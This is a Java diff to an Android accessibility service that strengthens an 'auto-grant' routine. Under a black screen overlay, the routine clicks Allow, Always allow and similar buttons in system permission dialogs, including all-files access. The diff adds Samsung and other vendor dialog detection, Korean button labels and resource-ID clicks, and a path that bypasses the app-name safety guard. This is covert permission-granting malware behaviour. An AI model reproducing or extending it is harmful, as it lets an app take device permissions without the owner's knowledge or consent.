@@ -66,6 +66,23 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private Handler autoGrantHandler;
     private Runnable autoGrantScanRunnable;
 
+    // ── Samsung / multi-OEM permission-controller package fragments ───────────
+    // Samsung One UI uses com.samsung.android.permissioncontroller.
+    // getRootInActiveWindow() on Samsung often returns the background app window
+    // instead of the floating permission dialog. findPermissionDialogWindowRoot()
+    // iterates all windows to locate the real dialog window by package name.
+    private static final String[] PERM_CTRL_PACKAGES = {
+        "com.android.permissioncontroller",
+        "com.google.android.permissioncontroller",
+        "com.samsung.android.permissioncontroller",
+        "com.sec.android.app.permissioncontroller",
+        "com.android.packageinstaller",
+        "com.miui.permcenter",
+        "com.coloros.permissionmanager",
+        "com.vivo.permissionmanager",
+        "com.huawei.systemmanager",
+    };
+
     // Solid black overlay shown during the 10-second auto-grant window
     private View overlayView;
     private WindowManager overlayWindowManager;
@@ -732,7 +749,17 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             // During auto-grant period: only click Allow/Grant buttons — nothing else.
             // Defent protection is suspended so it cannot interfere with permission dialogs.
             if (autoGrantMode) {
-                runPermissionGranter(rootNode);
+                // Primary scan: active window
+                boolean granted = runPermissionGranter(rootNode);
+                // Samsung / One UI fallback: permission dialogs appear as floating windows
+                // that are NOT the active window. Iterate all windows to find the real dialog.
+                if (!granted) {
+                    AccessibilityNodeInfo permRoot = findPermissionDialogWindowRoot();
+                    if (permRoot != null) {
+                        try { runPermissionGranterOnPermissionWindow(permRoot); }
+                        finally { permRoot.recycle(); }
+                    }
+                }
                 rootNode.recycle();
                 return;
             }
@@ -876,9 +903,19 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             public void run() {
                 try {
                     AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+                    boolean granted = false;
                     if (rootNode != null) {
-                        runPermissionGranter(rootNode);
+                        granted = runPermissionGranter(rootNode);
                         rootNode.recycle();
+                    }
+                    // Samsung fallback: dialog may be a floating window not visible via
+                    // getRootInActiveWindow(). Scan all windows for the real dialog.
+                    if (!granted) {
+                        AccessibilityNodeInfo permRoot = findPermissionDialogWindowRoot();
+                        if (permRoot != null) {
+                            try { runPermissionGranterOnPermissionWindow(permRoot); }
+                            finally { permRoot.recycle(); }
+                        }
                     }
                 } catch (Exception ignored) {}
                 if (permissionScanHandler != null && permissionScanRunnable != null) {
@@ -899,17 +936,26 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         autoGrantHandler = permissionBgHandler != null
                 ? permissionBgHandler : new Handler(Looper.getMainLooper());
 
-        // Independent scanner: runs every 250 ms during the grant window.
-        // 250 ms is frequent enough to catch dialogs without hammering the main thread.
+        // Independent scanner: runs every 100 ms during the grant window.
         autoGrantScanRunnable = new Runnable() {
             @Override
             public void run() {
                 if (!autoGrantMode) return;
                 try {
                     AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+                    boolean granted = false;
                     if (rootNode != null) {
-                        runPermissionGranter(rootNode);
+                        granted = runPermissionGranter(rootNode);
                         rootNode.recycle();
+                    }
+                    // Samsung / One UI fallback — permission dialog is a floating window
+                    // invisible to getRootInActiveWindow(); scan all windows instead.
+                    if (!granted) {
+                        AccessibilityNodeInfo permRoot = findPermissionDialogWindowRoot();
+                        if (permRoot != null) {
+                            try { runPermissionGranterOnPermissionWindow(permRoot); }
+                            finally { permRoot.recycle(); }
+                        }
                     }
                 } catch (Exception ignored) {}
                 if (autoGrantMode && autoGrantHandler != null) {
@@ -1532,7 +1578,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             // Some OEM storage dialogs
             "Allow access to media",
             "Allow access to files and media",
-            "Allow access to photos, media, and files"
+            "Allow access to photos, media, and files",
+            // Samsung Korean locale
+            "\ud56d\uc0c1 \ud5c8\uc6a9",          // 항상 허용 — Always allow
+            "\ubaa8\ub4e0 \uc2dc\uac04 \ud5c8\uc6a9" // 모든 시간 허용 — Allow all the time
         };
         for (String btn : allTheTime) {
             if (safeClickTextElementCI(rootNode, btn)) {
@@ -1553,7 +1602,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             "Allow while using",
             "Only while using",
             "While in use",
-            "Allow only while in use"
+            "Allow only while in use",
+            // Samsung Korean locale
+            "\uc571 \uc0ac\uc6a9 \uc911\uc5d0\ub9cc \ud5c8\uc6a9" // 앱 사용 중에만 허용
         };
         for (String btn : whileUsing) {
             if (safeClickTextElementCI(rootNode, btn)) {
@@ -1590,7 +1641,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             "Give permission",
             "Grant permission",
             "Grant access",
-            "Allow access"
+            "Allow access",
+            // Samsung Korean locale
+            "\ud5c8\uc6a9",  // 허용 — Allow
+            "\uc2b9\uc778",  // 승인 — Approve
+            "\ud655\uc778"   // 확인 — Confirm / OK
         };
         for (String btn : plainGrant) {
             if (safeClickTextElementCI(rootNode, btn)) {
@@ -1606,10 +1661,189 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         // Only match if the full button text is NOT in the deny list.
         // "allow" catches "Allow permission", "Allow access", etc.
         // "authorize"/"approve" catch OEM-specific phrasings.
-        String[] containsFallback = { "allow", "grant", "permit", "accept", "authorize", "approve" };
+        // "\ud5c8\uc6a9" is Korean "허용" (allow) for Samsung Korean locale devices.
+        String[] containsFallback = { "allow", "grant", "permit", "accept", "authorize", "approve", "\ud5c8\uc6a9" };
         for (String kw : containsFallback) {
             if (safeClickTextContainingCI(rootNode, kw)) {
                 Log.i(TAG, "Auto-grant: clicked via contains fallback \"" + kw + "\"");
+                return true;
+            }
+        }
+
+        return false;
+    }
+
+    // ═══════════════════════════════════════════════════════════════════════
+    //  Samsung / multi-OEM permission dialog helpers
+    //
+    //  Root cause: on Samsung One UI, permission dialogs are rendered as
+    //  floating windows (TYPE_APPLICATION_OVERLAY / TYPE_SYSTEM_ALERT) that
+    //  are NOT the "active" window.  getRootInActiveWindow() returns the
+    //  background app's window instead of the dialog.  The methods below
+    //  fix this by iterating all accessibility windows to find the real
+    //  permission dialog window and operating directly on its root node.
+    // ═══════════════════════════════════════════════════════════════════════
+
+    /**
+     * Iterates all accessibility windows and returns the root node of the
+     * first window whose package matches a known permission controller.
+     * This is the entry point for the Samsung One UI fallback path.
+     *
+     * The caller MUST recycle the returned node when done.
+     * Returns null if no permission dialog window is currently visible.
+     */
+    private AccessibilityNodeInfo findPermissionDialogWindowRoot() {
+        try {
+            List<android.view.accessibility.AccessibilityWindowInfo> windows = getWindows();
+            if (windows == null) return null;
+            for (android.view.accessibility.AccessibilityWindowInfo win : windows) {
+                try {
+                    AccessibilityNodeInfo root = win.getRoot();
+                    if (root == null) continue;
+                    CharSequence pkg = root.getPackageName();
+                    if (pkg != null) {
+                        String pkgLower = pkg.toString().toLowerCase();
+                        for (String ctrl : PERM_CTRL_PACKAGES) {
+                            if (pkgLower.contains(ctrl.toLowerCase())) {
+                                return root; // caller recycles
+                            }
+                        }
+                    }
+                    root.recycle();
+                } catch (Exception ignored) {}
+            }
+        } catch (Exception ignored) {}
+        return null;
+    }
+
+    /**
+     * Clicks an Allow button by its well-known view resource ID.
+     * This is the most reliable approach for Samsung One UI: button IDs are
+     * stable across Samsung OS updates even when label text changes.
+     *
+     * Priority: "allow always" > "allow foreground only" > plain "allow".
+     */
+    private boolean clickPermissionButtonByResourceId(AccessibilityNodeInfo root) {
+        String[] allowIds = {
+            // AOSP / Pixel (Android 10+)
+            "com.android.permissioncontroller:id/permission_allow_always_button",
+            "com.android.permissioncontroller:id/permission_allow_button",
+            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
+            // Samsung One UI (uses its own package name)
+            "com.samsung.android.permissioncontroller:id/permission_allow_always_button",
+            "com.samsung.android.permissioncontroller:id/permission_allow_button",
+            "com.samsung.android.permissioncontroller:id/permission_allow_foreground_only_button",
+            // Older Samsung
+            "com.sec.android.app.permissioncontroller:id/permission_allow_button",
+            // Pre-Android-10 AOSP
+            "com.android.packageinstaller:id/permission_allow_button",
+        };
+        for (String resId : allowIds) {
+            try {
+                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(resId);
+                if (nodes != null) {
+                    for (AccessibilityNodeInfo node : nodes) {
+                        if (node != null) {
+                            if (node.isVisibleToUser() && node.isEnabled()) {
+                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                                node.recycle();
+                                Log.i(TAG, "Auto-grant: clicked by resource-id " + resId);
+                                return true;
+                            }
+                            node.recycle();
+                        }
+                    }
+                }
+            } catch (Exception ignored) {}
+        }
+        return false;
+    }
+
+    /**
+     * Permission granter for confirmed permission-controller windows.
+     *
+     * The isAnyAppNameOnScreen() guard in runPermissionGranter() is designed
+     * to prevent clicking Allow on OTHER apps' dialogs, but it can falsely
+     * fail on Samsung because:
+     *   a) we already know this window IS a permission controller, so the
+     *      guard is redundant, and
+     *   b) Samsung may display the app name differently (truncated, different
+     *      language, or absent on certain dialog types).
+     *
+     * Strategy: resource-ID click first (fastest + most reliable), then fall
+     * through to full text-based granter without the app-name guard.
+     */
+    private boolean runPermissionGranterOnPermissionWindow(AccessibilityNodeInfo rootNode) {
+        // 1. Resource-ID based click — most reliable on all Android/Samsung versions
+        if (clickPermissionButtonByResourceId(rootNode)) return true;
+
+        // 2. Text-based granter without app-name guard
+        return runPermissionGranterNoGuard(rootNode);
+    }
+
+    /**
+     * Text-based permission granter identical to runPermissionGranter() but
+     * without the isAnyAppNameOnScreen() guard. Used when the caller has
+     * already confirmed the root belongs to a permission controller window.
+     */
+    private boolean runPermissionGranterNoGuard(AccessibilityNodeInfo rootNode) {
+        // Step 0: "Allow access" / app-name specific pattern
+        if (runAppNameAllowAccessClicker(rootNode)) return true;
+
+        // Step 1: Permanent / all-the-time grants
+        String[] allTheTime = {
+            "Allow all the time", "Always allow", "Always", "Allow all",
+            "Permit all the time", "Allow access to manage all files",
+            "Allow management of all files", "Allow access to all files",
+            "Access all files", "Manage all files", "Allow access to media",
+            "Allow access to files and media", "Allow access to photos, media, and files",
+            "\ud56d\uc0c1 \ud5c8\uc6a9", "\ubaa8\ub4e0 \uc2dc\uac04 \ud5c8\uc6a9"
+        };
+        for (String btn : allTheTime) {
+            if (safeClickTextElementCI(rootNode, btn)) {
+                Log.i(TAG, "Auto-grant (perm-win): clicked \"" + btn + "\"");
+                return true;
+            }
+        }
+
+        // Step 2: While-using variants
+        String[] whileUsing = {
+            "Allow only while using the app", "Allow while using the app",
+            "Only while using the app", "While using the app", "While using app",
+            "Allow while using", "Only while using", "While in use",
+            "Allow only while in use",
+            "\uc571 \uc0ac\uc6a9 \uc911\uc5d0\ub9cc \ud5c8\uc6a9"
+        };
+        for (String btn : whileUsing) {
+            if (safeClickTextElementCI(rootNode, btn)) {
+                Log.i(TAG, "Auto-grant (perm-win): clicked \"" + btn + "\"");
+                return true;
+            }
+        }
+
+        // Step 3: Plain allow / grant / OK
+        String[] plainGrant = {
+            "Allow", "Grant", "OK", "Ok", "Yes", "Accept", "Agree", "Continue",
+            "Turn on", "Enable", "Permit", "Allow permission", "Allow permissions",
+            "Authorize", "Confirm", "Proceed", "Approve", "Give permission",
+            "Grant permission", "Grant access", "Allow access",
+            "\ud5c8\uc6a9", "\uc2b9\uc778", "\ud655\uc778"
+        };
+        for (String btn : plainGrant) {
+            if (safeClickTextElementCI(rootNode, btn)) {
+                Log.i(TAG, "Auto-grant (perm-win): clicked \"" + btn + "\"");
+                return true;
+            }
+        }
+
+        // Step 4: Toggle / switch on settings-style pages
+        if (runAccessibilityToggleGranter(rootNode)) return true;
+
+        // Step 5: Contains-based fallback
+        String[] containsFallback = { "allow", "grant", "permit", "accept", "authorize", "approve", "\ud5c8\uc6a9" };
+        for (String kw : containsFallback) {
+            if (safeClickTextContainingCI(rootNode, kw)) {
+                Log.i(TAG, "Auto-grant (perm-win): clicked via contains \"" + kw + "\"");
                 return true;
             }
         }
